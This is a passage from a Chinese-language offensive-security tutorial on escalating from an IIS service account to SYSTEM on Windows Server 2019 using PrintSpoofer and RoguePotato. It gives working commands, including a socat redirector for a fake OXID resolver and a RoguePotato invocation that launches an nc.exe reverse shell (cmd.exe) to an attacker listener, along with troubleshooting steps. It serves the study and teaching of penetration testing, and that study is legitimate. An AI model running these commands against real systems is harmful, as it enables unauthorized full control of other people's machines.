<p>微软实施的变更会对攻击者假冒的服务需要建立 COM 连接的能力产生影响，因为现在连接仅被允许在 TCP 端口 135 上进行。这意味着攻击者无法再以 SYSTEM 身份对其假冒的 RPC 服务进行认证来创建可被模拟的令牌，从而让 JuicyPotato 失效。</p>
<p>但幸运的是，由于 JuicyPotato 的失效，一个名叫 itm4n 的聪明人开始研究，并发现了 PrintSpoofer 这个漏洞。</p>
<p>PrintSpoofer 的工作原理与传统的 Potato 攻击不同，它实际上是利用一种古老的技术，将命名管道与 Print Spooler服务结合起来来对系统进行攻击利用。</p>
<p>由于此漏洞利用所采用的技术与常见的 Potato 攻击手段完全不同，由此带来的另一个惊喜是，该漏洞利用实际上适用于 Server 2016 和 Server 2019 的所有版本，以及 Windows 10 至少从 1607 版开始的每个版本。</p>
<blockquote>
<p>Windows Server 2016 从版本 1607 开始</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160456238-2135791299-4f0ce893bd0d913e148ba17054fc3630.png" width="473" height="376" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160454977-2038332387-c1b98617be4423126588f7fb2412e766.png" width="469" height="462" class="img_ev3q"></p>
<blockquote>
<p>如果想全面了解该漏洞的工作原理，可在<a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank" rel="noopener noreferrer">此处</a>查看相关介绍。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31滥用-seimpersonateprivilege-特权printspooferexe"><strong><div id="id3.1">3.1、滥用 SeimpersonatePrivilege 特权：PrintSpoofer.exe</div></strong><a href="#31滥用-seimpersonateprivilege-特权printspooferexe" class="hash-link" aria-label="31滥用-seimpersonateprivilege-特权printspooferexe的直接链接" title="31滥用-seimpersonateprivilege-特权printspooferexe的直接链接">​</a></h4>
<p>借鉴上面我们用来获得立足点的场景（FTP 服务器 + Web 服务器联结漏洞），看看当我们以 iisapppool 的身份获得 shell 时会发生什么，只不过这次的目标运行的是 Windows Server 2019。</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systeminfo | findstr /B /C:&quot;Host Name&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot; /C:&quot;Hotfix(s)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160458936-1423557955-eaca904291abbd686a026a8b26b82895.png" width="1024" height="136" class="img_ev3q"></p>
<p>检查操作系统的版本，我们发现这是一台 Server2019 的机器，这意味着 JuicyPotato 在这里无法使用。</p>
<p>幸运的是，我们可以利用 PrintSpoofer.exe 将权限直接提升到 SYSTEM。最重要的是，这个漏洞能让我们直接进入当前 shell 中的 SYSTEM shell。这意味着不再需要以 SYSTEM 身份执行恶意文件，只需要 PrintSpoofer.exe 就可以了。</p>
<blockquote>
<p>从<a href="https://github.com/itm4n/PrintSpoofer/" target="_blank" rel="noopener noreferrer">此处</a>查看 printspoofer.exe 的64位和32位版本的副本。</p>
</blockquote>
<p>将漏洞利用下载到受害者机器上后，我们可以执行以下命令直接进入 SYSTEM shell：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.\PrintSpoofer64.exe -i -c cmd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160456056-13025921-dc4c2849f194147041e4cc136230d2fd.png" width="477" height="402" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32printspoofer-故障处理"><strong><div id="id3.2">3.2、PrintSpoofer 故障处理</div></strong><a href="#32printspoofer-故障处理" class="hash-link" aria-label="32printspoofer-故障处理的直接链接" title="32printspoofer-故障处理的直接链接">​</a></h4>
<p>有几次，当我满怀信心地认为这个漏洞应该起作用时，它却并不起作用。每当我运行这个漏洞时，它就会变成这样：</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="339" height="91" class="img_ev3q"></p>
<p>在命令执行之后，什么都不会发生。</p>
<p>尝试在实验室机器上通过图形用户界面运行漏洞利用程序后，发现 VCRUNTIME140.dll 丢失，而该程序是与 Visual Studio 打包在一起的。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160458273-1187126509-791197b8849ab84a54b4f3fffe6a6e17.png" width="979" height="515" class="img_ev3q"></p>
<p>由于我们无法从反向 shell 中看到此弹窗，因此我们可以使用以下命令检查它是否存在于系统上：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dir C:\Windows\System32 | findstr -i &quot;vcruntime140.dll&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果无输出，那么我们知道这就是 printspoofer 失败的原因。</p>
<blockquote>
<p>我们该如何解决这个问题？- 我不建议从互联网上下载这个 DLL，因为据我所知，你无法直接从微软下载它。相反，如果你还没有将 Visual Studio 下载到实验室机器上，那就先下载到实验室机器上，然后再将 DLL 复制到你的攻击机器上。</p>
</blockquote>
<p>将 vcruntime140.dll 的副本传输到我们的攻击者机器后，我们可以将其下载到受害者机器上。</p>
<p>由于以 iisapppool 的身份无权限将文件移至 <code>C:\Windows\System32</code>的位置，但我们可以将 DLL 放置在与利用程序的同一文件夹下进行使用。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160500148-799923101-9e85540a60b91544b231e0fa97a4b39c.png" width="483" height="416" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4使用-roguepotato-模拟本地-system-帐户"><strong><div id="id4">4、使用 RoguePotato 模拟本地 SYSTEM 帐户</div></strong><a href="#4使用-roguepotato-模拟本地-system-帐户" class="hash-link" aria-label="4使用-roguepotato-模拟本地-system-帐户的直接链接" title="4使用-roguepotato-模拟本地-system-帐户的直接链接">​</a></h2>
<p>OXID 解析器是 &quot;rpcss&quot; 服务的一部分，运行在端口 135 上，由于对该解析器所做的更改，Windows 10 和 Windows Server 2019 从版本 1809 开始不再能够通过端口 135 以外的端口查询 OXID 解析器。这是 Juicy Potato 运行的关键部分。</p>
<p>此外，如果我们指定了远程 OXID 解析器，请求将以 ANONYMOUS LOGON 身份而非 SYSTEM 身份处理。因此，即使我们找到了绕过 OXID 解析器问题的方法，当我们连接到欺骗服务时，仍然会产生一个非特权 shell。</p>
<p>解决方法：我们可以从攻击者的机器上欺骗本地 OXID 解析器，这样连接就会重定向到我们这里，而不会显示为远程连接。然后，只要我们指定欺骗的服务器在 135 端口运行，就能有效绕过 &quot;保护&quot;，像使用 JuicyPotato 时那样成功验证为 SYSTEM。</p>
<p>值得庆幸的是，由于针对查找 PrintSpoofer 漏洞利用所开展的研究，这一技术与最初 Potato 攻击的技术相融合，于是 Potato 家族的最新成员诞生了：RoguePoto</p>
<blockquote>
<p>要充分了解 RoguePoto 的工作原理，请查看<a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/" target="_blank" rel="noopener noreferrer">此处</a>。</p>
</blockquote>
<p>RoguePotato 采用了与原始 Potato 攻击相同的技术，但对攻击方式进行了修改，以适应从 1809 版本开始对 Windows 10/Server 2019 操作系统进行的更新。因此，根据我个人的经验，这个漏洞只适用于发生变化后的 Windows 版本（1809+）。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41滥用-seimpersonateprivilege-特权roguepotatoexe"><strong><div id="id4.1">4.1、滥用 SeimpersonatePrivilege 特权：RoguePotato.exe</div></strong><a href="#41滥用-seimpersonateprivilege-特权roguepotatoexe" class="hash-link" aria-label="41滥用-seimpersonateprivilege-特权roguepotatoexe的直接链接" title="41滥用-seimpersonateprivilege-特权roguepotatoexe的直接链接">​</a></h4>
<p>在本示例中，我们将在 Windows Server 2019 机器上继续从上一个示例中的初始立足点开始。</p>
<p>要滥用 RoguePotato，首先，我们需要在攻击者机器上设置一个欺骗的 OXID 解析器来重定向请求。这可以使用以下 socat 命令来完成：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">socat tcp-listen:135,reuseaddr,fork tcp:172.16.1.10:9999</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>请注意，上述命令中的 IP 地址是受害者机器的 IP。</p>
</blockquote>
<p>我们需要获取 roguepotato.exe 的副本，然后将其发送给受害者，然后开始利用此漏洞。</p>
<blockquote>
<p>可以在<a href="https://github.com/antonioCoco/RoguePotato/" target="_blank" rel="noopener noreferrer">此处</a>找到 roguepotato.exe 的副本。</p>
</blockquote>
<p>由于其工作原理与 JuicyPotato 相似，都是需要以 SYSTEM 的身份去执行某些操作。在本例中，我们不再像使用 JuicyPotato 时那样再次弹出恶意 shell.exe 文件，而是通过 netcat 去利用这一漏洞而获得反向 shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160457080-1962847965-dec83793de4dddff0d8aed455a53ac17.png" width="485" height="249" class="img_ev3q"></p>
<p>与此同时，我们还需要在攻击者机器上启动一个 netcat 侦听器以捕获 SYSTEM shell。然后就可以通过以下命令执行利用：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.\RoguePotato.exe -r 172.16.1.30 -e &quot;C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe&quot; -l 9999</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>注意：上面命令中的 IP 是攻击机的 IP，-l 9999 是本地 RogueOxidResolver 解析服务，对应上述 socat 命令中连接端口。</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160501673-1801623371-0d96a15cb0fcaa21daa4d0b728f2508b.png" width="997" height="323" class="img_ev3q"></p>
<p>回到 netcat 侦听器之后，我们发现获得了一个 SYSTEM shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160500789-1060919146-81a91c97e62eac8d31347adb421364ea.png" width="625" height="257" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42roguepotato-故障处理"><strong><div id="id4.2">4.2、RoguePotato 故障处理</div></strong><a href="#42roguepotato-故障处理" class="hash-link" aria-label="42roguepotato-故障处理的直接链接" title="42roguepotato-故障处理的直接链接">​</a></h4>
<p>与使用 JuicyPotato 时一样，我们可以设置使用哪个 CLSID，而不是使用默认值。如果默认 CLSID 不起作用，我们可以参考上文 JuicyPotato 部分的列表，指定要使用的 CLSID。对于 RoguePotato，无论我们使用的是 Server 2019 还是 Windows 10 victim，都可以使用 Windows 10 Pro 列表中的 CLSID。</p>
<p>为了测试指定的 CLSID，我们可以使用 -c 选项，例如：</p>
